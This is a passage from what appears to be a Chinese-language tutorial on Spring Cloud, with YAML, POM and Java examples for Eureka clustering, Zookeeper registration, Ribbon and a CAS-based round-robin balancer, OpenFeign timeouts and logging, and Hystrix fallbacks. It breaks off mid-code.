class="line"></span><br><span class="line">  <span class="attr">client:</span></span><br><span class="line">    <span class="attr">register-with-eureka:</span> <span class="literal">false</span> <span class="comment">#不注册自己</span></span><br><span class="line"></span><br><span class="line">    <span class="attr">fetch-registry:</span> <span class="literal">false</span> <span class="comment">#自己是服务端不需要去检测服务</span></span><br><span class="line">    <span class="attr">service-url:</span>   <span class="comment">#默认是 "defaultZone", "http://localhost:8761/eureka/"</span></span><br><span class="line">      <span class="attr">defaultZone:</span> <span class="string">http://localhost:8761/eureka/</span></span><br><span class="line"><span class="comment">#服务名称</span></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">eureka-server</span></span><br></pre></td></tr></table></figure><h3 id="Eureka集群"><a href="#Eureka集群" class="headerlink" title="Eureka集群"></a>Eureka集群</h3><blockquote><p>1先启动eureka注册中心<br>2启动服务提供者paymen支付服务<br>3支付服务启动后会把自身信息(比如服务地址以别名方式注<br>册进eureka)<br>4消费者order服务在需要调用接口时，使用服务别名去注册<br>中心获取实际的RPC远程调用地址<br>5消费者获得调用地址后，底层实际是利用<code>HttpClient</code>技术<br>,实现远程调用<br>6消费者获得服务地址后会缓存在<code>本地jvm内存</code>中，默认每间<br>隔30秒更新一次服务调用地址</p></blockquote><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment">### 集群下，多个server之间相互注册即可（defaultZone）</span></span><br><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">7000</span></span><br><span class="line"></span><br><span class="line"><span class="attr">eureka:</span></span><br><span class="line">  <span class="attr">instance:</span></span><br><span class="line">    <span class="attr">hostname:</span> <span class="string">eureka7000.com</span>   <span class="comment">#服务端实例名称</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">client:</span></span><br><span class="line">    <span class="attr">register-with-eureka:</span> <span class="literal">false</span> <span class="comment">#不注册自己</span></span><br><span class="line"></span><br><span class="line">    <span class="attr">fetch-registry:</span> <span class="literal">false</span> <span class="comment">#自己是服务端不需要去检测服务</span></span><br><span class="line">    <span class="attr">service-url:</span>   <span class="comment">#默认是 "defaultZone", "http://localhost:8761/eureka/"</span></span><br><span class="line">      <span class="attr">defaultZone:</span> <span class="string">http://eureka8000.com:8000/eureka/</span></span><br><span class="line"><span class="comment">#服务名称</span></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">eureka-server</span></span><br></pre></td></tr></table></figure><p>:star:默认情况下，Eureka集群之间会自动同步复制，也就是只需要注册一个注册中心即可。</p><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200712110648512.png" alt="image-20200712110648512"></p><h3 id="服务调用"><a href="#服务调用" class="headerlink" title="服务调用"></a>服务调用</h3><h4 id="修改Order模块控制层"><a href="#修改Order模块控制层" class="headerlink" title="修改Order模块控制层"></a>修改Order模块控制层</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@Slf</span>4j</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">OrderController</span> </span>&#123;</span><br><span class="line">	<span class="comment">//以服务名访问，不再是ip</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String PAYMENT_URL = <span class="string">"http://CLOUD-PAYMENT-SERVICE"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> RestTemplate restTemplate;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping</span>(<span class="string">"/consumer/payment/create"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> CommonResult&lt;Payment&gt; <span class="title">create</span><span class="params">(Payment payment)</span></span>&#123;</span><br><span class="line">        <span class="comment">//三个参数：请求URL，发送的对象， 返回值类型</span></span><br><span class="line">        <span class="keyword">return</span> restTemplate.postForObject(PAYMENT_URL+</span><br><span class="line">                <span class="string">"/payment/create"</span>, payment, CommonResult<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@GetMapping</span>(<span class="string">"/consumer/payment/get/&#123;id&#125;"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> CommonResult&lt;Payment&gt; <span class="title">getPayment</span><span class="params">(@PathVariable(<span class="string">"id"</span>)</span> Long id)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> restTemplate.getForObject(PAYMENT_URL+<span class="string">"/payment/get/"</span>+id,</span><br><span class="line">                CommonResult<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="添加负载均衡"><a href="#添加负载均衡" class="headerlink" title="添加负载均衡"></a>添加负载均衡</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ApplicationContextConfig</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="meta">@LoadBalanced</span>   <span class="comment">//负载均衡</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> RestTemplate <span class="title">getRestTemplate</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> RestTemplate();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Eureka自我保护机制"><a href="#Eureka自我保护机制" class="headerlink" title="Eureka自我保护机制"></a>Eureka自我保护机制</h3><p>默认情况下，如果EurekaServer在一定时间内没有接收到某 个微服务实例的心跳，EurekaServer将 会注销该实例(默认90秒)。但是当网络分区故障发生(延时、卡顿、拥挤)时,微服务与EurekaServer之间无法正常通信，以上行为可能变得非常危险了一因为微服务本身其实是健康的,此时本不应该注销这个微服务。Eureka通过”自我保护模式”来解决这个问题一-当EurekaServer节 点在短时间内丢失过多客户端时(可能发生了网络分区故障) , 那么这个节点就会进入自我保护模式。</p><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">instance :</span></span><br><span class="line">    <span class="comment">#Eureka客户端向服务端发送心跳的时间间隔，单位为秒(默认是30秒)</span></span><br><span class="line">    <span class="attr">lease-renewal-interval-in-seconds:</span> <span class="number">1</span></span><br><span class="line">    <span class="comment">#Eureka服势端在收到最后一次心跳后等待时间上限，单位为秒( 默认是90秒)，超时将剔除服务</span></span><br><span class="line">    <span class="attr">lease-expiration-duration-in-seconds:</span> <span class="number">2</span></span><br></pre></td></tr></table></figure><h3 id="使用Zookeeper替代Eureka"><a href="#使用Zookeeper替代Eureka" class="headerlink" title="使用Zookeeper替代Eureka"></a>使用Zookeeper替代Eureka</h3><blockquote><p>POM导包</p></blockquote><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--SpringBoot整合Zookeeper客户端--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-zookeeper-discovery<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-actuator<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">	 <span class="comment">&lt;!--boot自动配置--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-autoconfigure<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.2.2.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--lombok--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.projectlombok<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>lombok<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.18.4<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--导入公共API--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.tosang<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>cloud-api-commons<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>YML配置</p></blockquote><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment">#8004表示注册到zookeeper服务器的支付服务提供者端口号</span></span><br><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8004</span></span><br><span class="line"><span class="comment">#服务别名----注册zookeeper到注册中心名称</span></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">cloud-provider-payment</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">zookeeper :</span></span><br><span class="line">      <span class="attr">connect-string:</span> <span class="number">192.168</span><span class="number">.2</span><span class="number">.106</span><span class="string">:2181</span></span><br></pre></td></tr></table></figure><blockquote><p>启动项目后检测是否注册进zk，可以看到cloud-provider-payment入驻，通过<code>get</code>可以获取连接详情</p></blockquote><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200714160236259.png" alt="image-20200714160236259"></p><h3 id="比较三个注册中心与CAP原则"><a href="#比较三个注册中心与CAP原则" class="headerlink" title="比较三个注册中心与CAP原则"></a>比较三个注册中心与CAP原则</h3><p>最多只能同时较好的满足两个。<br>CAP理论的核心是: 一个分布式系统不可能同时很好的满足致性， 可用性和分区容错性这三个需求,<br>因此，根据CAP原理将NoSQL数据库分成了满足CA原则、满足CP原则和满足AP原则三大类:<br>CA-单点集群，满足一致性,可用性的系统，通常在可扩展性上不太强大。<br>CP-满足一致性,分区容忍必的系统，通常性能不是特别高。<br>AP-满足可用性,分区容忍性的系统,通常可能对一致性要求低一些。</p><p><code>AP --- Eureka</code><br><code>CP --- Zookeeper/Consul</code></p><h3 id="Ribbon"><a href="#Ribbon" class="headerlink" title="Ribbon"></a>Ribbon</h3><blockquote><p>Spring Cloud Ribbon是基于Netlix Ribbon实现的一套<code>客户端负载均衡</code>的工具。Ribbon属于进程内LB。</p><p>新版netflix的eureka集成了Ribbon</p></blockquote><h4 id="RestTemplate补充"><a href="#RestTemplate补充" class="headerlink" title="RestTemplate补充"></a>RestTemplate补充</h4><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200714174838728.png" alt="image-20200714174838728"></p><h4 id="Ribbon负载规则替换"><a href="#Ribbon负载规则替换" class="headerlink" title="Ribbon负载规则替换"></a>Ribbon负载规则替换</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//注意该类必须定义在不同于业务类所在包，否则会失效</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MySelfRule</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> IRule <span class="title">myRule</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> RandomRule();<span class="comment">//定义为随机</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>主启动类添加RibbonClient</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="meta">@EnableEurekaClient</span></span><br><span class="line"><span class="meta">@RibbonClient</span>(name = <span class="string">"CLOUD-PAYMENT-SERVICE"</span>, configuration = MySelfRule<span class="class">.<span class="keyword">class</span>)</span></span><br><span class="line"><span class="class"><span class="title">public</span> <span class="title">class</span> <span class="title">OrderMain80</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        SpringApplication.run(OrderMain80<span class="class">.<span class="keyword">class</span>, <span class="title">args</span>)</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Ribbon的轮询算法底层使用了：CAS-自旋锁"><a href="#Ribbon的轮询算法底层使用了：CAS-自旋锁" class="headerlink" title="Ribbon的轮询算法底层使用了：CAS+自旋锁"></a>Ribbon的轮询算法底层使用了：<code>CAS+自旋锁</code></h4><blockquote><p>CAS（Compare-and-Swap），即比较并替换，java并发包中许多Atomic的类的底层原理都是CAS。</p><p>它的功能是判断内存中某个地址的值是否为预期值，如果是就改变成新值，整个过程具有原子性。</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> <span class="comment">//实例</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CASDemo</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">      <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">  </span><br><span class="line">          <span class="comment">//初始值5</span></span><br><span class="line">          AtomicInteger atomicInteger = <span class="keyword">new</span> AtomicInteger(<span class="number">5</span>);</span><br><span class="line">  </span><br><span class="line">          <span class="comment">//和5比较,设置为10</span></span><br><span class="line">          System.out.println(<span class="string">"预期值:5,当前值:"</span>+atomicInteger);</span><br><span class="line">         System.out.println(<span class="string">"是否设置成功:"</span>+atomicInteger.compareAndSet(<span class="number">5</span>, <span class="number">10</span>));</span><br><span class="line">         <span class="comment">//和5比较,设置为15</span></span><br><span class="line">         System.out.println(<span class="string">"预期值:5,当前值:"</span>+atomicInteger);</span><br><span class="line">         System.out.println(<span class="string">"是否设置成功:"</span>+atomicInteger.compareAndSet(<span class="number">5</span>, <span class="number">15</span>));</span><br><span class="line"> </span><br><span class="line">         System.out.println(<span class="string">"当前值:"</span>+atomicInteger);</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">预期值:<span class="number">5</span>,当前值:<span class="number">5</span></span><br><span class="line">是否设置成功:<span class="keyword">true</span></span><br><span class="line">预期值:<span class="number">5</span>,当前值:<span class="number">10</span></span><br><span class="line">是否设置成功:<span class="keyword">false</span></span><br><span class="line">当前值:<span class="number">10</span></span><br></pre></td></tr></table></figure><blockquote><p>所谓自旋：即循环进行CAS</p></blockquote><h4 id="手写轮询算法"><a href="#手写轮询算法" class="headerlink" title="手写轮询算法"></a>手写轮询算法</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyLb</span> <span class="keyword">implements</span> <span class="title">LoadBalancer</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//原子整型</span></span><br><span class="line">    <span class="keyword">private</span> AtomicInteger atomicInteger = <span class="keyword">new</span> AtomicInteger(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title">getAndIncrement</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">//自旋锁+CAS</span></span><br><span class="line">        <span class="keyword">int</span> current;</span><br><span class="line">        <span class="keyword">int</span> next;</span><br><span class="line">        <span class="keyword">do</span>&#123;</span><br><span class="line">            current = <span class="keyword">this</span>.atomicInteger.get();</span><br><span class="line">            <span class="comment">//这里写法有点问题，MAX+1会变成-2^32</span></span><br><span class="line">            next = current &gt;= Integer.MAX_VALUE ? <span class="number">0</span> : current + <span class="number">1</span>;</span><br><span class="line">        &#125;<span class="keyword">while</span> (!<span class="keyword">this</span>.atomicInteger.compareAndSet(current, next));</span><br><span class="line">        System.out.println(<span class="string">"*****第几次访问，次数为next = "</span>+next);</span><br><span class="line">        <span class="keyword">return</span> next;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> ServiceInstance <span class="title">instances</span><span class="params">(List&lt;ServiceInstance&gt; serviceInstances)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> index = getAndIncrement() % serviceInstances.size();</span><br><span class="line">        <span class="keyword">return</span> serviceInstances.get(index);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="OpenFeign"><a href="#OpenFeign" class="headerlink" title="OpenFeign"></a>OpenFeign</h3><p>Feign是一个声明式WebService客户端。 使佣Feign能让编写Web Service客户端更加简单。它的使用方法是<code>定义一个服务接口然后在上面添加注解</code>。Feign也支持可拔插式的编码器和解码器。Spring Cloud对Feign进行了封装，使其支持了Spring MVC标准注解和HttpMessageConverters. Feign可以与Eureka和Ribbon组合使用以支持<strong>负载均衡</strong>。类似于<code>dubbo</code>。OpenFeign是支持SpringMVC的改进</p><blockquote><p>POM</p></blockquote><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--openfeign--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-openfeign<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>YML</p></blockquote><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">80</span></span><br><span class="line"></span><br><span class="line"><span class="attr">eureka:</span></span><br><span class="line">  <span class="attr">client:</span></span><br><span class="line">    <span class="attr">register-with-eureka:</span> <span class="literal">false</span></span><br><span class="line">    <span class="attr">service-url:</span></span><br><span class="line">      <span class="attr">defaultZone:</span> <span class="string">http://eureka7001.com:7001/eureka/</span></span><br></pre></td></tr></table></figure><blockquote><p>主启动类</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="meta">@EnableFeignClients</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">OrderFeignMain80</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        SpringApplication.run(OrderFeignMain80<span class="class">.<span class="keyword">class</span>, <span class="title">args</span>)</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>接口</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@FeignClient</span>(value = <span class="string">"CLOUD-PAYMENT-SERVICE"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">PaymentFeignService</span> </span>&#123;</span><br><span class="line">    <span class="meta">@GetMapping</span>(value= <span class="string">"/payment/get/&#123;id&#125;"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> CommonResult <span class="title">getPaymentById</span><span class="params">(@PathVariable(<span class="string">"id"</span>)</span>Long id)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="OpenFeign超时控制"><a href="#OpenFeign超时控制" class="headerlink" title="OpenFeign超时控制"></a>OpenFeign超时控制</h4><p>默认Feign客户端只等待一秒钟， 但是服务端处理需要超过1秒钟，导致Feign客户端不想等待了， 直接返回报错。为了避免这样的情况，有时候我们需要设置Feign客户端的超时控制。</p><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment">#没置feign客端超时时间(openFeign默认支持ribbon)</span></span><br><span class="line"><span class="attr">ribbon:</span></span><br><span class="line"><span class="comment">#指的是建立连接后从服务器读取到可用资源所用的时间</span></span><br><span class="line">	<span class="attr">ReadTimeout:</span> <span class="number">5000</span></span><br><span class="line"><span class="comment">#指的是建立连接所用的时间，适用于网络状况正常的情况下两端连接所用的时间</span></span><br><span class="line">	<span class="attr">connectTimeout:</span> <span class="number">5000</span></span><br></pre></td></tr></table></figure><h4 id="OpenFeign日志级别"><a href="#OpenFeign日志级别" class="headerlink" title="OpenFeign日志级别"></a>OpenFeign日志级别</h4><p><code>NONE</code>:默认的,不显示任何日志;<br><code>BASIC</code>: 仅记录请求方法、URL、 响应状态码及执行时间;<br><code>HEADERS</code>:除了BASIC中定义的信息之外，还有请求和响应的头信息; .<br><code>FULL</code>: 除了HEADERS中定义的信息之外，还有请求和响应的正文及元数据。</p><blockquote><p>编写config.FeignConfig</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FeignConfig</span></span>&#123;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    Logger.<span class="function">Level <span class="title">feignLoggerLevel</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> Logger.Level.FULL;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>YML</p></blockquote><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">logging:</span></span><br><span class="line">	<span class="attr">level:</span></span><br><span class="line">		<span class="comment"># feign日志以什么级别监控哪个接口</span></span><br><span class="line">		<span class="attr">com.atguigu.springcloud.service.PaymentFeignService:</span> <span class="string">debug</span></span><br></pre></td></tr></table></figure><h3 id="Hystrix"><a href="#Hystrix" class="headerlink" title="Hystrix"></a>Hystrix</h3><h4 id="Hystrix断路器"><a href="#Hystrix断路器" class="headerlink" title="Hystrix断路器"></a>Hystrix断路器</h4><p>​ 多个微服务之间调用的时候，假设微服务A调用微服务B和微服务C,微服务B和微服务C又调用其它的微服务,这就是所谓的”扇出”。如果扇出的链路上某个微服务的调用响应时间过长或者不可用，对微服务A的调用就会占用越来越多的系统资源，进而引起系统崩溃,所<br>谓的“雪崩效应”.<br>​ 对于高流量的应用来说，单一的后端依赖可能会导致所有服务器 上的所有资源都在几秒钟内饱和。比失败更糟糕的是,这些应用程序还<br>可能导致服务之间的延迟增加，备份队列，线程和其他系统资源紧张，导致整个系统发生更多的级联故障。这些都表示需要对故障和延迟进行隔离和管理，以便单个依赖关系的失败，不能取消整个应用程序或系统。</p><blockquote><p>Hystrix是一个用于处理分布式系统的延迟和容错的开源库， 在分布式系统里,许多依赖不可避免的会调用失败,比如超时、异常等，Hystrix能够保证在一个依赖出问题的情况下， 不会导致整体服务失败，避免级联故障,以提高分布式系统的弹性。</p><p>“断路器”本身是一 种开关装置，当某个服务单元发生故障之后，通过断路器的故障监控(类似熔断保险丝) ,向调用方返回一个符合预期的、可处理的备选响应(FallBack) ，而不是长时间的等待或者抛出调用方无法处理的异常,这样就保证了服务调用方的线程不会被长时间、不必要地占用，从而避免了故障在分布式系统中的蔓延,乃至雪崩。</p></blockquote><h4 id="服务降级、熔断和限流"><a href="#服务降级、熔断和限流" class="headerlink" title="服务降级、熔断和限流"></a>服务降级、熔断和限流</h4><blockquote><p>降级相当于兜底的方案，而不是直接返回错误；熔断相当于保险丝；限流一般用在高并发和秒杀场景</p></blockquote><h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><blockquote><p>POM</p></blockquote><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-netflix-hystrix<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>YML</p></blockquote><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8001</span></span><br><span class="line"></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">cloud-provider-hystrix-payment</span></span><br><span class="line"></span><br><span class="line"><span class="attr">eureka:</span></span><br><span class="line">  <span class="attr">client:</span></span><br><span class="line">    <span class="attr">register-with-eureka:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">fetch-registry:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">service-url:</span></span><br><span class="line">      <span class="attr">defaultZone:</span> <span class="string">http://eureka7001:7001/eureka</span></span><br></pre></td></tr></table></figure><h4 id="JMeter测压"><a href="#JMeter测压" class="headerlink" title="JMeter测压"></a>JMeter测压</h4><p>100 QPS 循环200次，会出现明显延迟</p><h4 id="服务降级"><a href="#服务降级" class="headerlink" title="服务降级"></a>服务降级</h4><blockquote><p>检测到异常会调用fallback方法；服务降级一般加在<code>客户端</code></p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PaymentService</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">paymentInfo_ok</span><span class="params">(Integer id)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"线程池： "</span></span><br><span class="line">                + Thread.currentThread().getName()</span><br><span class="line">                + <span class="string">"paymentInfo_ok, id"</span></span><br><span class="line">                + id</span><br><span class="line">                + <span class="string">"\t"</span></span><br><span class="line">                + <span class="string">"hhhhhh"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@HystrixCommand</span>(fallbackMethod = <span class="string">"paymentInfo_TimeOutHandler"</span>, commandProperties = &#123;</span><br><span class="line">            <span class="meta">@HystrixProperty</span>(name = <span class="string">"execution.isolation.thread.timeoutInMilliseconds"</span>, value = <span class="string">"3000"</span>)</span><br><span class="line">    &#125;) <span class="comment">//name里面是异常类型</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">paymentInfo_TimeOut</span><span class="params">(Integer id)</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            TimeUnit.SECONDS.sleep(<span class="number">5</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            